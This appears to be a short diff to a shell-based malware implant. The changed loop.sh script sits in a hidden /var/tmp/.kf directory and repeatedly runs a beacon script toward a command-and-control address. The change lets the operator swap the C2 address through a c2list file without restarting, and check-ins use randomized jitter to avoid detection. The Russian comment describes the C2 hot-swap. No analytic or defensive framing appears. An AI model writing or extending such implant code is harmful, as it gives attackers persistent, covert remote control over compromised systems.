@@ -153,8 +153,12 @@ chmod 700 "$D/beacon.sh"
 cat > "$D/loop.sh" <<'LP'
 #!/bin/sh
 D=/var/tmp/.kf
+ID="$1"; C2="$2"
 while :; do
-  sh "$D/beacon.sh" "$@"
+  # адрес перечитываем каждый тик: смена C2 подхватывается без перезапуска
+  _c2=$(cat "$D/c2list" 2>/dev/null)
+  [ -n "$_c2" ] || _c2="$C2"
+  sh "$D/beacon.sh" "$ID" $_c2
   j=$(od -An -N1 -tu1 /dev/urandom 2>/dev/null | tr -d ' \n'); case "$j" in ''|*[!0-9]*) j=0 ;; esac
   sleep $(( 10 + j % 30 ))
 done
